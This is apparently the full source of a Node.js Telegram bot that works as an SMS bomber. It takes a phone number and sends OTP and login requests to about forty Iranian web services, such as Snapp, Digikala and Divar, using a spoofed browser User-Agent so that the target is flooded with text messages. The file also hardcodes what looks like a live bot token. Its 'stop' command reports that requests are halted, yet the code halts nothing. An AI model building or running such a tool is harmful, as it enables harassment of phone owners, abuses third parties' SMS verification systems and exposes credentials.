const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const token = '7252116522:AAHJlPUkFJJHjN3AufQ6jh6Zm1BIIN1RHLA';
const bot = new TelegramBot(token, { polling: true });
function sendOtpRequests(phoneNumber) {
    const apis = [
        {
            "name": "Snapp V1",
            "url": "https://api.snapp.ir/api/v1/sms/link",
            "data": {"phone": phoneNumber},
        },
        {
            "name": "Snapp V2",
            "url": `https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=${phoneNumber}`,
            "data": {"cellphone": phoneNumber},
        },
        {
            "name": "Achareh",
            "url": "https://api.achareh.co/v2/accounts/login/",
            "data": {"phone": `98${phoneNumber.substring(1)}`},
        },
        {
            "name": "Zigap",
            "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
            "data": {"phoneNumber": `+98${phoneNumber.substring(1)}`},
        },
        {
            "name": "Jabama",
            "url": "https://gw.jabama.com/api/v4/account/send-code",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "Banimode",
            "url": "https://mobapi.banimode.com/api/v2/auth/request",
            "data": {"phone": phoneNumber},
        },
        {
            "name": "Classino",
            "url": "https://student.classino.com/otp/v1/api/login",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "Digikala V1",
            "url": "https://api.digikala.com/v1/user/authenticate/",
            "data": {"username": phoneNumber, "otp_call": false},
        },
        {
            "name": "Digikala V2",
            "url": "https://api.digikala.com/v1/user/forgot/check/",
            "data": {"username": phoneNumber},
        },
        {
            "name": "Sms.ir",
            "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
            "data": phoneNumber,
        },
        {
            "name": "Alibaba",
            "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
            "data": {"phoneNumber": phoneNumber.substring(1)},
        },
        {
            "name": "Divar",
            "url": "https://api.divar.ir/v5/auth/authenticate",
            "data": {"phone": phoneNumber},
        },
        {
            "name": "Sheypoor",
            "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
            "data": {"username": phoneNumber},
        },
        {
            "name": "Bikoplus",
            "url": "https://bikoplus.com/account/check-phone-number",
            "data": {"phoneNumber": phoneNumber},
        },
        {
            "name": "Mootanroo",
            "url": "https://api.mootanroo.com/api/v3/auth/send-otp",
            "data": {"PhoneNumber": phoneNumber},
        },
        {
            "name": "Tap33",
            "url": "https://tap33.me/api/v2/user",
            "data": {"credential": {"phoneNumber": phoneNumber, "role": "BIKER"}},
        },
        {
            "name": "Tapsi",
            "url": "https://api.tapsi.ir/api/v2.2/user",
            "data": {
                "credential": {"phoneNumber": phoneNumber, "role": "DRIVER"},
                "otpOption": "SMS",
            },
        },
        {
            "name": "GapFilm",
            "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
            "data": {"Type": "3", "Username": phoneNumber.substring(1)},
        },
        {
            "name": "IToll",
            "url": "https://app.itoll.com/api/v1/auth/login",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "Anargift",
            "url": "https://api.anargift.com/api/v1/auth/auth",
            "data": {"mobile_number": phoneNumber},
        },
        {
            "name": "Nobat",
            "url": "https://nobat.ir/api/public/patient/login/phone",
            "data": {"mobile": phoneNumber.substring(1)},
        },
        {
            "name": "Lendo",
            "url": "https://api.lendo.ir/api/customer/auth/send-otp",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "Hamrah-Mechanic",
            "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
            "data": {"PhoneNumber": phoneNumber},
        },
        {
            "name": "Abantether",
            "url": "https://abantether.com/users/register/phone/send/",
            "data": {"phoneNumber": phoneNumber},
        },
        {
            "name": "OKCS",
            "url": "https://my.okcs.com/api/check-mobile",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "Tebinja",
            "url": "https://www.tebinja.com/api/v1/users",
            "data": {"username": phoneNumber},
        },
        {
            "name": "Bit24",
            "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "Rojashop",
            "url": "https://rojashop.com/api/send-otp-register",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "Paklean",
            "url": "https://client.api.paklean.com/download",
            "data": {"tel": phoneNumber},
        },
        {
            "name": "Khodro45",
            "url": "https://khodro45.com/api/v1/customers/otp/",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "Delino",
            "url": "https://www.delino.com/user/register",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "DigikalaJet",
            "url": "https://api.digikalajet.ir/user/login-register/",
            "data": {"phone": phoneNumber},
        },
        {
            "name": "Miare",
            "url": "https://www.miare.ir/api/otp/driver/request/",
            "data": {"phone_number": phoneNumber},
        },
        {
            "name": "Dosma",
            "url": "https://app.dosma.ir/api/v1/account/send-otp/",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "Ostadkr",
            "url": "https://api.ostadkr.com/login",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "Sibbazar",
            "url": "https://sandbox.sibbazar.com/api/v1/user/invite",
            "data": {"username": phoneNumber},
        },
        {
            "name": "Namava",
            "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
            "data": {"UserName": `+98${phoneNumber.substring(1)}`},
        },
        {
            "name": "Shab",
            "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",
            "data": {"mobile": phoneNumber},
        },
        {
            "name": "Bitpin",
            "url": "https://api.bitpin.org/v2/usr/signin/",
            "data": {"phone": phoneNumber},
        },
        {
            "name": "Taaghche",
            "url": "https://gw.taaghche.com/v4/site/auth/signup",
            "data": {"contact": phoneNumber},
        }
    ];

    return apis;
}
const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: "📱 Send OTP", request_contact: true }],
            [{ text: "ℹ️ Help" }],
            [{ text: "🚫 Stop All Requests" }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "👋 Welcome to OTP Request Bot!\n\n📱 Press the button below to send your phone number:", mainMenu);
});
bot.onText(/ℹ️ Help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "📖 Help Guide:\n\n1. Click '📱 Send OTP' button to share your phone number\n2. The bot will start sending OTP requests to the provided number\n3. Use '🚫 Stop All Requests' to cancel ongoing requests\n\n⚠️ Note: Use this bot responsibly and only with numbers you have permission to test.");
});
bot.on('contact', async (msg) => {
    const chatId = msg.chat.id;
    const phoneNumber = msg.contact.phone_number;
    if (!phoneNumber) {
        return bot.sendMessage(chatId, "❌ Invalid phone number. Please try again.");
    }
    bot.sendMessage(chatId, `⏳ Starting OTP requests to: ${phoneNumber}...`, {
        reply_markup: {
            remove_keyboard: true
        }
    });
    try {
        const apis = sendOtpRequests(phoneNumber);
        let successCount = 0;
        let failCount = 0;
        for (const api of apis) {
            try {
                const response = await axios.post(api.url, api.data, {
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                    }
                });
                if (response.status === 200 || response.status === 201) {
                    successCount++;
                } else {
                    failCount++;
                }
            } catch (error) {
                failCount++;
            }
        }
        bot.sendMessage(chatId, `✅ OTP requests completed!\n\n📊 Results:\n✔️ Successful: ${successCount}\n❌ Failed: ${failCount}\n\nTotal services: ${apis.length}`);
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ An error occurred while processing your request. Please try again later.");
    }
});
bot.onText(/🚫 Stop All Requests/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "🛑 All ongoing OTP requests have been stopped.", mainMenu);
});
console.log("OTP Request Bot is running...");
